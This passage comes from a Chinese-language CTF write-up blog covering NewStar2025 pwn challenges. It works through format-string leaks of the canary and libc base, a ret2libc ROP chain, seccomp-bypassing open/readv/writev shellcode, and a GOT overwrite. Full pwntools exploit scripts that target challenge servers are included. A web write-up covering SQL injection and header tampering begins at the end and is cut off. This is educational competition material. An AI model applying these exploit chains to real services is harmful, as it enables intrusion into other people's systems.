0x2a3e5</strong>  , 在libc找到了 “&#x2F;bin&#x2F;sh” :</p><p><img src="/35c004db1f00a6867790da1951ab189e.png" alt="screen-capture"></p><p><strong>sh_addr &#x3D; 基址 + 0x1d8678</strong></p><p> 找”&#x2F;bin&#x2F;sh” 和 system函數:</p><p><img src="/0d5ddaf3cd76a7041ec020cf0497f7fe.png" alt="screen-capture"></p><p>bin&#x2F;sh:  基址 + 0x1D8678</p><p><img src="/0e369501325e153d6279ad86724aabb9.png" alt="screen-capture"></p><p>system:  基址 + 0x50D70</p><br/><h3 id="格式化字符串漏洞泄露libc基址"><a href="#格式化字符串漏洞泄露libc基址" class="headerlink" title="格式化字符串漏洞泄露libc基址"></a>格式化字符串漏洞泄露libc基址</h3><p><a href="https://www.cnblogs.com/GGbomb/p/17872974.html">https://www.cnblogs.com/GGbomb/p/17872974.html</a></p><br/><p>在canary後面有一個__libc_start_call_main+122 : 0x7ffff7c2a1ca</p><p>用vmmap找到基址:</p><p><img src="/6623abda426005e1b34c7f7ffb9759ae.png" alt="92fb3825-187e-415a-85c4-e5891e11b509.png"></p><p>0x7ffff7c29e40-0x7ffff7c00000 &#x3D; 0x29E40</p><p><img src="/d1106da3ce6626e9f3cf76358ba6be05.png" alt="b5349a57-5bfa-4cb3-a2a2-c953fae619fb.png"></p><p>(0xd568-0xd4b8 )&#x2F;8 &#x3D; 22<br>11+22 &#x3D; 33</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%11$.p%33%p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#nc 47.94.87.199 39160</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.94.87.199&#x27;,39160)     </span></span><br><span class="line">p = process(<span class="string">&#x27;./fmt_canary&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt_canary&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;aaaa%11$p.%13$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;说话!\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment">#libc的</span></span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc - <span class="number">0x2a1ca</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">sh_addr = libc_base + <span class="number">0x1d8678</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x50D70</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>然後就是正常的libc了 , </p><p><img src="/1d6f85f88116b19907ddd029f6c16602.png" alt="screen-capture"></p><p><img src="/ffd06d9481921c7c8ae347b52de09d76.png" alt="screen-capture"></p><br/><p><img src="/31833bab8ba39c21e0633c09bde6491a.png" alt="screen-capture"></p><p><img src="/3e112562cc15017bdb039fa9f0ff5915.png" alt="screen-capture"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 39.106.48.123 28287</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">28287</span>)   </span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)      </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./fmt_canary&#x27;)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./fmt_canary&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;我先放台复读机在这里!要是觉得厌倦了就输入end来结束吧\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;aaaa%11$p.%33$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;说话!\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc的</span></span><br><span class="line">libc_a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc_a - <span class="number">0x29E40</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x29139</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x2A3e5</span> + libc_base</span><br><span class="line">binsh = <span class="number">0x1D8678</span> + libc_base</span><br><span class="line">system = <span class="number">0x50D70</span> + libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;说话!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;end&quot;</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;QwQ:&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(&quot;end&quot;) </span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sandbox-plus"><a href="#sandbox-plus" class="headerlink" title="sandbox_plus"></a>sandbox_plus</h2><p> seccomp-tools dump .&#x2F;sandbox_plus 一下</p><p><img src="/c47060c8f2cf28feff3ccdb4539374cb.png" alt="screen-capture"></p><p>被ban ARCH_X86_64 execve  execveat  open  read write sendfile 怎麼辦?</p><p><img src="/5f6659df11542ee2ce1483cb40440f4b.png" alt="screen-capture"></p><p>看了main函數明顯這是一個Shellcode 題目:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *buf; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap((void *)<span class="number">0x114514</span>, 0x1000u, <span class="number">7</span>, <span class="number">34</span>, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  puts(<span class="string">&quot;please input a orw_plus function (also also after compile)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x500u);</span><br><span class="line">  install_seccomp();</span><br><span class="line">  ((void (*)(void))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> buf &#x3D; mmap((void *)0x114514, 0x1000u, 7, 34, -1, 0);是指改變0x114514 處的記憶體映射為可讀、可寫、可執行</p><p>Shellcode 構造 (AORW):</p><p>設置 iovec 結構:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, &#123;buffer_addr&#125;</span><br><span class="line">mov qword ptr [&#123;iovec_addr&#125;], rax</span><br><span class="line">mov qword ptr [&#123;iovec_addr&#125; + 8], 0x100</span><br></pre></td></tr></table></figure><p>openat(“flag.txt”):</p><ul><li><pre><code>將 &quot;flag.txt&quot; 字串寫入内存<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```assembly_x86</span><br><span class="line">mov rdi, &#123;flag_str_addr&#125;</span><br><span class="line">mov rsi, 0x7478742e67616c66  // &quot;flag.txt&quot;</span><br><span class="line">mov qword ptr [rdi], rsi</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>openat(AT_FDCWD, &quot;flag.txt&quot;, O_RDONLY, 0) , syscall 是指令地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```assembly_x86</span><br><span class="line">mov rax, 0x101               // __NR_openat = 257</span><br><span class="line">mov rdi, 0xFFFFFF9C          // AT_FDCWD (-100)</span><br><span class="line">mov rsi, &#123;flag_str_addr&#125;     // &quot;flag.txt&quot;</span><br><span class="line">xor rdx, rdx                 // O_RDONLY</span><br><span class="line">syscall                      // RAX = fd</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>readv(fd, &amp;iov, 1):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rax                 // RDI = fd</span><br><span class="line">mov rax, 0x13                // __NR_readv = 19</span><br><span class="line">mov rsi, &#123;iovec_addr&#125;        // RSI = &amp;iovec</span><br><span class="line">mov rdx, 0x1                 // RDX = 1 (iovec count)</span><br><span class="line">syscall                      // 讀取內容</span><br></pre></td></tr></table></figure><p>writev(STDOUT, &amp;iov, 1):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x14                // __NR_writev = 20</span><br><span class="line">mov rdi, 0x1                 // RDI = STDOUT_FILENO (1)</span><br><span class="line">mov rsi, &#123;iovec_addr&#125;        // RSI = &amp;iovec</span><br><span class="line">mov rdx, 0x1                 // RDX = 1 (iovec count)</span><br><span class="line">syscall                      // 輸出內容</span><br></pre></td></tr></table></figure><p>exit(0):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x3c                // __NR_exit = 60</span><br><span class="line">xor rdi, rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>合在一起的python 就是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 39.106.57.152 39122</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;39.106.57.152&#x27;</span>,<span class="number">39122</span>)   </span><br><span class="line"></span><br><span class="line">BUF_ADDR = <span class="number">0x114514</span>      <span class="comment"># mmap 地址</span></span><br><span class="line">IOVEC_ADDR = BUF_ADDR + <span class="number">0x100</span> <span class="comment"># iovec 結構地址</span></span><br><span class="line">BUFFER_ADDR = BUF_ADDR + <span class="number">0x200</span> <span class="comment"># 文件內容緩衝區地址</span></span><br><span class="line">FLAG_STR_ADDR = BUF_ADDR + <span class="number">0x300</span> <span class="comment"># &quot;flag&quot; 字串地址 (註：根據你的 ls 結果，文件是 &#x27;flag&#x27; 而非 &#x27;flag.txt&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修正組譯錯誤，移除行尾註釋和不必要的空格</span></span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* ------------------- 1. 設置 iovec 結構 ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BUFFER_ADDR&#125;</span></span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;IOVEC_ADDR&#125;</span>], rax</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;IOVEC_ADDR&#125;</span> + 8], 0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 2. openat(&quot;flag&quot;) ------------------- */</span></span><br><span class="line"><span class="string">    /* 將 &quot;flag&quot; 字串寫入内存 (4 bytes, 故只需 mov dword) */</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;FLAG_STR_ADDR&#125;</span></span></span><br><span class="line"><span class="string">    mov rsi, 0x67616c66        # &quot;flag&quot;</span></span><br><span class="line"><span class="string">    mov dword ptr [rdi], esi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* openat(AT_FDCWD, &quot;flag&quot;, O_RDONLY, 0) */</span></span><br><span class="line"><span class="string">    mov rax, 0x101             # __NR_openat = 257</span></span><br><span class="line"><span class="string">    mov rdi, 0xFFFFFF9C        # AT_FDCWD (-100)</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;FLAG_STR_ADDR&#125;</span>   # &quot;flag&quot;</span></span><br><span class="line"><span class="string">    xor rdx, rdx               # O_RDONLY</span></span><br><span class="line"><span class="string">    syscall                    # RAX = fd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 3. readv(fd, &amp;iov, 1) ------------------- */</span></span><br><span class="line"><span class="string">    mov rdi, rax               # RDI = fd</span></span><br><span class="line"><span class="string">    mov rax, 0x13              # __NR_readv = 19</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;IOVEC_ADDR&#125;</span>      # RSI = &amp;iovec</span></span><br><span class="line"><span class="string">    mov rdx, 0x1               # RDX = 1 (iovec count)</span></span><br><span class="line"><span class="string">    syscall                    # 讀取內容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 4. writev(STDOUT, &amp;iov, 1) ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, 0x14              # __NR_writev = 20</span></span><br><span class="line"><span class="string">    mov rdi, 0x1               # RDI = STDOUT_FILENO (1)</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;IOVEC_ADDR&#125;</span>      # RSI = &amp;iovec</span></span><br><span class="line"><span class="string">    mov rdx, 0x1               # RDX = 1 (iovec count)</span></span><br><span class="line"><span class="string">    syscall                    # 輸出內容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 5. exit(0) ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, 0x3c              # __NR_exit = 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="only-read-味复刻"><a href="#only-read-味复刻" class="headerlink" title="only_read(味复刻)"></a>only_read(味复刻)</h2><p><img src="/93992dc96bf7e31ed0d80e8bcc0a6576.png" alt="screen-capture"></p><p><img src="/eee302b8a320dcfd5759c51f3a7f756f.png" alt="screen-capture"></p><p><img src="/bb101dcfdd2acbb5e4aed9f79d281c65.png" alt="screen-capture"></p><p>ban了 execve</p><h3 id="這一題是SROP-栈迁移-ORW"><a href="#這一題是SROP-栈迁移-ORW" class="headerlink" title="這一題是SROP + 栈迁移 + ORW"></a>這一題是SROP + 栈迁移 + ORW</h3><p>srop 是 sigreturn rop 的簡稱<br>參考影片:<br><a href="https://www.bilibili.com/video/BV1ob32zuExQ/?spm_id_from=333.337.search-card.all.click&vd_source=b128d59725d91ecef706ce0b01795a8f">https://www.bilibili.com/video/BV1ob32zuExQ/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>有一個gift:</p><p>return 15 是一個sigreturn的系統調用<br>signal frame No.1 –&gt; bss 寫入”&#x2F;flag\x00”  (6位)<br>signal frame No.2 –&gt; SYS_open<br>signal frame No.3 –&gt; SYS_read<br>signal frame No.4 –&gt; SYS_write<br>先看看bss段:<br><img src="/000fa080e02c4b7aaa6cabe2930d9e93.png" alt="screen-capture"></p><p> 0x404000   -   0x405000 rwp<br>bss &#x3D; 0x404000</p><p><img src="/a35ba9d44b8d5da00d140547e72392a4.png" alt="screen-capture"></p><p> syscall &#x3D; 0x40136d (gift)</p><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>即使攻击者可以控制返回地址，栈上的空间（16字节）也太小了，无法放下复杂的攻击载荷（payload）。<br>这通常通过一个 leave; ret “gadget”（小工具代码段）来实现。<br>leave 指令等同于 mov rsp, rbp; pop rbp</p><h2 id="ORW-1"><a href="#ORW-1" class="headerlink" title="ORW"></a>ORW</h2><p>可以參考week2的noshell</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>「栈遷移」＋「布置 sigframe」<br>vuln buffer 只有 0x10 bytes 太小，放不下 sigframe（sigframe 結構很大）。<br>所以我們利用 leave; ret gadget 來把 stack 指針 rsp 移到一個大的可控區域<br>找leave; ret gadget :</p><p>leave_ret &#x3D; 0x4012b0<br>payload    &#x3D; b’A’ * 0x10<br>payload +&#x3D; p64(bss)<br>payload +&#x3D; p64(leave_ret)</p><h3 id="No-1-No-2-No-3-No-4"><a href="#No-1-No-2-No-3-No-4" class="headerlink" title="No.1 No.2 No.3 No.4"></a>No.1 No.2 No.3 No.4</h3><p>已知<br>syscall gadget &#x3D; 0x40136d（gift）bss &#x3D; 0x404000<br>SYS_read :</p><p>SYS_open:</p><p>SYS_read:</p><p>SYS_ write</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="fmt-and-got-味复刻"><a href="#fmt-and-got-味复刻" class="headerlink" title="fmt and got(味复刻)"></a>fmt and got(味复刻)</h2><p><img src="/1427336ac17890391f025d9d964497fa.png" alt="screen-capture"></p><p>第一次: plt-&gt;got-&gt;plt-&gt;更改函数改got-&gt;重新执行-&gt;去往真实函数</p><p>第二次plt-&gt;got-&gt;真实函数</p><p>存放函数地址的数据表，称为全局偏移表（GOT, Global Offset Table），而那个额外代码段表，称为程序链接表（PLT，Procedure Link Table）</p><h3 id="Ubuntu-GLIBC-2-35-0ubuntu3-10-1"><a href="#Ubuntu-GLIBC-2-35-0ubuntu3-10-1" class="headerlink" title="Ubuntu GLIBC 2.35-0ubuntu3.10"></a>Ubuntu GLIBC 2.35-0ubuntu3.10</h3><p>用patchelf更換 libc 和 ld 文件<br><img src="/abf3c83028a19983967c4a2d5f9b1aac.png" alt="screen-capture"></p><p><img src="/f6e94609176cf6e793e551bf7d048913.png" alt="fffffdd7-24d9-4ee8-ac48-42a010c30d2e.png"></p><p>(0xd4a8-0xd3a0)&#x2F;8 &#x3D; 33 , 33+6 &#x3D; 39</p><p>%39$p</p><p><img src="/ccd3025f4ef2fff9d28bb2ec01b6a249.png" alt="635eb358-2363-4edf-8335-00edb7adb334.png"></p><p>%61$p</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%39$p.%61$p</span><br></pre></td></tr></table></figure><p><img src="/55d86fef80c753c5ffe8955b574da78a.png" alt="screen-capture"></p><p>0x7ffff7c29e40 - 0x7ffff7c00000 &#x3D; 0x29E40</p><p>libc_base &#x3D; libc - 0x29E40</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./fmt_got&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&#x27;./fmt_got&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;aaaa%39$p.%61$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">libc_a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc_a - <span class="number">0x29E40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_a))</span><br><span class="line"></span><br><span class="line">read_flag_addr = elf.symbols[<span class="string">&#x27;read_flag&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_flag_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>format-string 改寫 GOT → 讓程式呼叫 read_flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2025 Web (1月尾會再更新)</title>
      <link href="/ghsc_ovo_0721/NewStar2025-Web-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/"/>
      <url>/ghsc_ovo_0721/NewStar2025-Web-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>作者：ghsc</p><p>前言:小弟因比完賽就一直補課和補作業，補完就期末考，所以要寒假才可以复刻。</p><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="1-multi-headach3"><a href="#1-multi-headach3" class="headerlink" title="1.multi-headach3"></a>1.multi-headach3</h2><p>什么叫机器人控制了我的头？ 一看就知道是robots.txt </p><img src="f55218c8ea70797e87de415ca66c44d1.png" alt="screen-capture.png"  /><img src="5bfcc56c224ba8bc2928d01a9dc1d568.png" alt="screen-capture.png"  /><h2 id="2-strange-login"><a href="#2-strange-login" class="headerlink" title="2.strange_login"></a>2.strange_login</h2><p>簡單sql注入:</p><img src="91f76867ac291990e6fe82bd77247d52.png" alt="screen-capture.png"  /><img src="bdd51a9553780dfbd0119b550a97bdb2.png" alt="screen-capture.png"  /><h2 id="3-黑客小W的故事（1）"><a href="#3-黑客小W的故事（1）" class="headerlink" title="3.黑客小W的故事（1）"></a>3.黑客小W的故事（1）</h2><p>HTTP 协议: 這題最後超難。</p><p>第一關:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包:看見了POST 傳參 &#123;&quot;count&quot;:1&#125; , 修改一下 改成&#123;&quot;count&quot;:1000&#125; </span><br></pre></td></tr></table></figure><img src="f4af20b7bbd1a72146466219a4fb3db2.png" alt="screen-capture.png"  /><img src="acb7675162910c0062017af90e5e27b1.png" alt="screen-capture.png"  /><br/><p>第二關: GET ?shipin&#x3D;mogubaozi POST a&#x3D;guding , 改DELETE 加上 b &#x3D; chongzi</p><img src="747aea9ea2dc6eaef2191d17075502de.png" alt="screen-capture.png"  /><p>第三關: </p><img src="bfed548a5249d3a23ca5098d5e127410.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;1.0 </p><img src="5a73ca97658ea4f187c38ef6fe00ccdc.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0</p><img src="5d40391d53c255be87ce1b71590fa358.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0 , DashSlash&#x2F;1.0</p><img src="362577da7b187536561a58fea98b9bde.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0 , DashSlash&#x2F;5.0</p><img src="413a67f617263aae3b6178e4272705b7.png" alt="screen-capture.png"  /><h2 id="4-宇宙的中心是php"><a href="#4-宇宙的中心是php" class="headerlink" title="4.宇宙的中心是php"></a>4.宇宙的中心是php</h2><img src="d633cbd7234c32336c9fd70f6d4f6423.png" alt="screen-capture.png"  /><img src="7fa0548af154aff4b4b75db1a2305e1d.png" alt="screen-capture.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 